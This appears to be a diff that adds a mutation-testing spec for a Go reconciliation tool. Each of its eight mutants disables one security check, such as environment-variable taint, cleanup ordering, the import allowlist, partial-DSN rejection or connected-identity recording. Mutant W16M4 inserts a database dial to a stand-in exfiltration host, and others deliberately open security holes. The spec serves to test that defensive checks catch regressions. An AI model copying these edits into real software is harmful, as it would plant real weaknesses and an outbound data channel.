@@ -1,0 +1,123 @@
+{
+  "meta": {
+    "task": "task-9 wave-16 (round-14 fixes: pgx PG* taint domain + connected identity; ordered cleanup; capability boundary; persisted daemon cadence)",
+    "applier": "../wave16-mutations/mutate.py (committed, exactly-once byte assertion, in-memory restores; the directory name is historical from task 8's wave numbering - it is the STANDING applier, not this wave's spec dir)",
+    "notes": "One mutant per enforcement mechanism, and for F3 one per EVASION SHAPE the brief names. EVERY SEARCH ANCHOR IS A SINGLE LINE: the working tree is CRLF here (git core.autocrlf normalizes on commit), and a multi-line pattern spelled with \\n silently matches NOTHING against CRLF - the wave-12 trap the applier exists to refuse. Single-line anchors are convention-independent, and each is asserted unique by the applier. Inserted lines in replacements use \\n; the compiler is indifferent and the restore is byte-exact from the in-memory copy. Every mutant COMPILES (verified by an in-memory-restored `go build ./...` + `go vet` probe before this spec was committed), so no kill is a disguised compile error. W16M2 and W16M8 are killed by DB-backed tests: the loop environment must export TEST_DATABASE_URL (the wave scratch DB solvent_t9w16) and SOLVENT_DATABASE_URL (the live DSN the destructive-split guard compares against). W16M2's kill is specifically an observation made DURING the cleanup - the mutant's post-return state is indistinguishable from the fix's (gate open, connection closed), which is exactly why round 14 found the bug by reading defer order rather than by running the old test."
+  },
+  "mutations": [
+    {
+      "id": "W16M1",
+      "property": "F1: every PG* variable pgx reads at connect time must presence-taint acceptance - an ambient PGHOST/PGDATABASE can point the connection at a different server while the receipt claims otherwise, and reconcile cannot prove from inside the run that it did not.",
+      "description": "the pgx PG* presence taint never fires (the closed table still classifies them; nothing taints)",
+      "test": ["go", "test", "./cmd/reconcile", "-run", "TestEnvSurfaceClosed|TestAmbientPGHostTaintsAcceptance", "-count=1"],
+      "edits": [
+        {
+          "file": "cmd/reconcile/env.go",
+          "search": "\treturn func(v string) string {",
+          "replace": "\treturn func(v string) string {\n\t\tif true {\n\t\t\treturn \"\" // W16M1: PG* presence taint removed\n\t\t}"
+        }
+      ]
+    },
+    {
+      "id": "W16M2",
+      "property": "F2: the gate must exit LAST - strictly after rollback and connection close. LIFO defers reopened the RPC surface while the transaction still held xmin; the ordering must be observable DURING the cleanup, not reconstructed from post-return state.",
+      "description": "the gate exits FIRST (the pre-wave LIFO behaviour), before rollback and close",
+      "test": ["go", "test", "./cmd/reconcile", "-run", "TestProductionGateActiveThroughSnapshotLifecycle", "-count=1"],
+      "edits": [
+        {
+          "file": "cmd/reconcile/snapshotdb/snapshotdb.go",
+          "search": "\t\tgate.checkpoint(StageBeforeRollback)",
+          "replace": "\t\tgate.Exit() // W16M2: gate-first, the LIFO order round 14 found\n\t\tgate.checkpoint(StageBeforeRollback)"
+        }
+      ]
+    },
+    {
+      "id": "W16M3",
+      "property": "F3 evasion shape 'os reintroduced': the import allowlist must state the TRUE capability set - `os` grants StartProcess (a network client one exec away), not just the one ReadFile the package wanted, so it may not come back for convenience.",
+      "description": "`os` re-imported into snapshotdb and used (compiles: the read is real)",
+      "test": ["go", "test", "./cmd/reconcile/snapshotdb", "-run", "TestSnapshotDBImportsAreDBOnly|TestSnapshotDBAPISurfaceRejectsInjection|TestSnapshotDBCapabilityBoundary", "-count=1"],
+      "edits": [
+        {
+          "file": "cmd/reconcile/snapshotdb/snapshotdb.go",
+          "search": "\t\"math/big\"",
+          "replace": "\t\"math/big\"\n\t\"os\""
+        },
+        {
+          "file": "cmd/reconcile/snapshotdb/snapshotdb.go",
+          "search": "\tp.ConfigSHA = prm.ConfigSHA",
+          "replace": "\tp.ConfigSHA = prm.ConfigSHA\n\tif raw, rerr := os.ReadFile(\"config/contracts.json\"); rerr == nil {\n\t\t_ = raw // W16M3: os is back - and StartProcess came with it\n\t}"
+        }
+      ]
+    },
+    {
+      "id": "W16M4",
+      "property": "F3 evasion shape 'capability through a STILL-ALLOWED package': pgx is legitimately imported (the DB is the point of Stage A) and pgx.Connect dials whatever DSN it is handed - so the boundary must pin the CALL SITE: exactly one dial, on the caller's audited roDSN. This is the sharpest shape the remaining allowlist permits and it needs no new import at all.",
+      "description": "a second pgx.Connect to an attacker-chosen host, opened under the closed gate (zero new imports, compiles)",
+      "test": ["go", "test", "./cmd/reconcile/snapshotdb", "-run", "TestSnapshotDBImportsAreDBOnly|TestSnapshotDBAPISurfaceRejectsInjection|TestSnapshotDBCapabilityBoundary", "-count=1"],
+      "edits": [
+        {
+          "file": "cmd/reconcile/snapshotdb/snapshotdb.go",
+          "search": "\tgate.Enter()",
+          "replace": "\tgate.Enter()\n\tif side, serr := pgx.Connect(ctx, \"postgres://exfil.example.internal:5432/x\"); serr == nil {\n\t\tside.Close(ctx) // W16M4: a network dial through the ALLOWED driver, under the open snapshot\n\t}"
+        }
+      ]
+    },
+    {
+      "id": "W16M5",
+      "property": "F3 evasion shape 'named-interface indirection': the AST test matches interface SPELLINGS, so a named interface in an EXPORTED field (store.Querier - a real, imported, allowlisted-package interface) parses as a SelectorExpr and slips through. Only semantic resolution of the UNDERLYING type refuses it, and an exported interface field is exactly the injection channel: cmd/reconcile CAN import chain and can implement it with a dialer.",
+      "description": "exported store.Querier field on Params, dispatched inside the open transaction (no interface literal anywhere; compiles)",
+      "test": ["go", "test", "./cmd/reconcile/snapshotdb", "-run", "TestSnapshotDBImportsAreDBOnly|TestSnapshotDBAPISurfaceRejectsInjection|TestSnapshotDBCapabilityBoundary", "-count=1"],
+      "edits": [
+        {
+          "file": "cmd/reconcile/snapshotdb/snapshotdb.go",
+          "search": "\tCollateralReplay int",
+          "replace": "\tCollateralReplay int\n\t// W16M5: a NAMED interface - the AST sees a SelectorExpr, never an\n\t// InterfaceType node.\n\tQ store.Querier"
+        },
+        {
+          "file": "cmd/reconcile/snapshotdb/snapshotdb.go",
+          "search": "\t// --- pins (§3.1): P = derive cursor read INSIDE the snapshot ----------",
+          "replace": "\tif prm.Q != nil {\n\t\t_, _ = store.DeriveCursorStates(ctx, prm.Q) // W16M5: dispatches whatever the caller loaded in\n\t}\n\t// --- pins (§3.1): P = derive cursor read INSIDE the snapshot ----------"
+        }
+      ]
+    },
+    {
+      "id": "W16M6",
+      "property": "F4: the freshness bound must be evaluated from the DAEMON-PERSISTED cadence (sweep_generations.configured_interval_seconds), never from the environment's copy of it - the env value is an unverifiable operator assertion, demoted to a cross-check that can only taint.",
+      "description": "the persisted-interval read replaced by the env read (the wave-15 channel, reinstated as a bound input)",
+      "test": ["go", "test", "./cmd/reconcile", "-run", "TestPersistedDaemonCadenceGovernsFreshnessBound|TestEnvVsPersistedMismatchTaintsAndNeverWidens|TestExtremeSnapshotIntervalEnvIsNonPass", "-count=1"],
+      "edits": [
+        {
+          "file": "cmd/reconcile/env.go",
+          "search": "\t\tinterval := time.Duration(*persisted) * time.Second",
+          "replace": "\t\tinterval, _ := resolveSnapshotInterval() // W16M6: env-read replaces the persisted read"
+        }
+      ]
+    },
+    {
+      "id": "W16M7",
+      "property": "F1: a partial DSN (no explicit host and/or database) must be REFUSED - pgx merges ambient PG* settings underneath it, so the claim's subject would be chosen by the environment rather than by the receipt.",
+      "description": "the partial-DSN rejection never fires",
+      "test": ["go", "test", "./cmd/reconcile", "-run", "TestPartialDSNIsRejected|TestReadOnlyDSNInjectsSessionOption", "-count=1"],
+      "edits": [
+        {
+          "file": "cmd/reconcile/main.go",
+          "search": "\tif u.Hostname() == \"\" || strings.TrimPrefix(u.Path, \"/\") == \"\" {",
+          "replace": "\tif false { // W16M7: partial-DSN rejection removed"
+        }
+      ]
+    },
+    {
+      "id": "W16M8",
+      "property": "F1: the artifact's database identity must be the CONNECTED identity the server reported over the snapshot's own connection - what the server says it is, never what the URL claimed.",
+      "description": "the connected-identity read is dropped (the artifact would carry the DSN's parsed claim alone)",
+      "test": ["go", "test", "./cmd/reconcile", "-run", "TestConnectedIdentityRecordsServerTruth", "-count=1"],
+      "edits": [
+        {
+          "file": "cmd/reconcile/snapshotdb/snapshotdb.go",
+          "search": "\tp.Identity, err = readConnectedIdentity(ctx, tx)",
+          "replace": "\t_ = readConnectedIdentity // W16M8: connected-identity recording removed"
+        }
+      ]
+    }
+  ]
+}
